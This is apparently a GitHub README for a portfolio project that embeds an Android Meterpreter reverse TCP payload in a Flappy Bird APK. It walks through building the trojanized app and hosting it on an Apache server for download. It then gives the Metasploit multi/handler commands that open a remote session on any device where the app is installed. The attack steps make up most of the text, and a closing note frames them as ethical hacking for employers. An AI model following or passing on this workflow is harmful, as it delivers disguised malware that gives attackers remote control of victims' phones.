# Flappy-Bird-or-Malware

Overview
This project demonstrates my ability to modify APK files and create payloads for penetration testing purposes. The Flappy Bird APK has been modified to include a reverse TCP payload, showcasing my skills in reverse engineering and malware analysis.

Requirements
Android Virtual Machine or Android Device: For running the modified APK.
Linux Machine: For creating the payload and setting up the listener.
APK File: The latest version of Flappy Bird APK.
Setup Instructions
Prepare the Environment

Ensure you have an Android Virtual Machine or a physical Android device.
Download the latest version of the Flappy Bird APK file and place it in a directory on your Linux machine.
Create the Payload

Open the terminal and navigate to the directory where the APK file is saved.

Execute the payload creation commands as outlined in the flappybird.txt file. Ensure you have root access:

bash

sudo su

If errors occur during payload creation, follow these troubleshooting steps:

Remove apktool and Reinstall:

bash

sudo apt-get remove apktool

sudo apt-get install apktool

Install zipalign:
bash

sudo apt-get install zipalign


Deploy the Payload
Move the generated payload to the /var/www/html directory:
bash
Copy code
sudo mv your_payload_file.apk /var/www/html/
Configure the Web Server

Start the Apache2 server to host the payload:
bash
sudo service apache2 start
Verify the payload is accessible via your browser at http://your_linux_machine_ip/your_payload_file.apk.
Set Up Metasploit Listener

Open msfconsole and configure it to handle the reverse TCP connection:
bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST your_linux_machine_ip
set LPORT your_chosen_port
exploit
Testing

Download and install the modified APK from the provided link on your Android device or emulator.
Upon opening the app, a Meterpreter session will initiate on your Linux machine, allowing you to interact with the device.
Skills Demonstrated
APK Modification: Embedding a payload into an existing APK file.
Payload Creation: Utilizing tools like msfvenom and apktool.
Metasploit Framework: Setting up a reverse TCP listener and managing Meterpreter sessions.
Web Server Configuration: Deploying and hosting files with Apache2.
Note
This project is intended to demonstrate my technical skills in ethical hacking and penetration testing. The techniques used are for educational purposes and to showcase my capabilities to potential employers.
